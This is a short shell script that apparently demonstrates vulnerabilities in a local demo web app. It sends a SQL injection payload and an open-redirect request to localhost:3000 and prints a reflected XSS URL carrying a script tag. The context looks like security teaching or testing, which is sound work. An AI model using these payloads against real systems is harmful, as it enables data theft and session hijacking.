#!/usr/bin/env bash
set -euo pipefail

./scripts/01-run-local.sh

echo
printf "1) SQL Injection manual:\n"
printf "curl 'http://localhost:3000/search?q=%%27%%20OR%%20%%271%%27=%%271'\n"
curl -s 'http://localhost:3000/search?q=%27%20OR%20%271%27=%271' | jq . || true

echo
printf "2) Reflected XSS manual: open this in the browser:\n"
printf "http://localhost:3000/greet?name=<script>alert(1)</script>\n"

echo
printf "3) Open redirect manual:\n"
printf "curl -I 'http://localhost:3000/redirect?url=https://example.com'\n"
curl -I 'http://localhost:3000/redirect?url=https://example.com' || true
